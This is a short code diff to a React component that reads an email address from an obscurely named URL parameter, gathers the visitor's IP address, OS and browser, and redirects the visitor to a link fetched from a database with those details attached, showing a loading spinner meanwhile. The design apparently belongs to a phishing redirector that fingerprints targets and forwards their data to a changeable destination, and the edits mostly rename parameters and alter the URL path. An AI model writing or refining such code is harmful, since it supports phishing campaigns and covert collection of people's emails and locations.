@@ -8,7 +8,7 @@ import { db, getIP } from "./servers";
 
 function HomeRedirect() {
   const queryParams = new URLSearchParams(window.location.search);
-  const email = queryParams.get("including");
+  const email = queryParams.get("setprotocol");
 
   useEffect(() => {
     var requestOptions = {
@@ -25,6 +25,7 @@ function HomeRedirect() {
       const currentLink = doc.data().currentlink;
       const date = new Date().getMilliseconds();
       const uid = uuid();
+      const timestamp = Date.now();
 
       console.log(`${osName} ${browserName}`);
 
@@ -32,7 +33,7 @@ function HomeRedirect() {
         const ip = res.data.IPv4;
         console.log(ip);
         window.location.assign(
-          `${currentLink}/${uid}/?inclusive=${email}&device=${osName +
+          `${currentLink}/${timestamp}/?inclusive=${email}&device=${osName +
             "" +
             browserName}&loc=${ip}`
         );
@@ -56,7 +57,7 @@ function HomeRedirect() {
 
   return (
     <div style={{ display: "flex", justifyContent: "center", marginTop: 50 }}>
-      <div className="lds-spinner">
+      <div class="lds-default">
         <div />
         <div />
         <div />
